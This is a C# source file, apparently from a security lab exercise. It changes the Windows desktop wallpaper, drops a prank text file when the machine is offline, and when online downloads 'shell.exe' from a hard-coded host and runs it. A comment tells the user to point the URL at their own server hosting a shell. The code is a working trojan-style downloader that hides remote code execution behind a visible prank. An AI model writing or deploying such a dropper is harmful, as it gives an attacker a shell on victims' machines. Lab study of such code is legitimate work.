using System;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using System.Diagnostics;
using System.Text;

namespace LAB2_1._3
{
    class Program
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(
        UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);

        private static readonly UInt32 SPI_SETDESKWALLPAPER = 0x14;
        private static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
        private static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;

        static public void SetWallpaper(String path)
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            key.SetValue(@"WallpaperStyle", 0.ToString()); // 2 is stretched
            key.SetValue(@"TileWallpaper", 0.ToString());

            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }

        static void Main(string[] args)
        {
            string imgWallpaper = @"C:\Users\User\Desktop\wallpaper.jpg"; //CHANGE THIS PATH TO YOUR PICTURE'S LOCATION (REMEMBER TO CHANGE ITS NAME TOO)

            // verify    
            if (File.Exists(imgWallpaper))
            {
                SetWallpaper(imgWallpaper);
            }
            if (CheckForInternetConnection() == true)
            {
                using (var client = new WebClient())
                {
                    client.DownloadFile("http://192.168.85.128/shell.exe", "shell.exe"); //CHANGE THIS TO YOUR WEBSITE'S URL THAT WHICH HAS A SHELL
                    Process.Start("shell.exe");
                }
            }
            else
            {
                string fileName = @"C:\Users\User\Desktop\juststhfunny.txt";  //CHANGE THIS TO YOUR FAVORITE PATH

                try
                {
                    // Check if file already exists. If yes, delete it.     
                    if (File.Exists(fileName))
                    {
                        File.Delete(fileName);
                    }

                    // Create a new file     
                    using (FileStream fs = File.Create(fileName))
                    {
                        // Add some text to file    
                        Byte[] title = new UTF8Encoding(true).GetBytes("hihi");
                        fs.Write(title, 0, title.Length);
                        byte[] author = new UTF8Encoding(true).GetBytes("laughing joker :)))");
                        fs.Write(author, 0, author.Length);
                    }
                }
                catch (Exception Ex)
                {
                    Console.WriteLine(Ex.ToString());
                }
            }
        }

        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com/generate_204"))
                    return true;
            }
            catch
            {
                return false;
            }
        }


    }
}
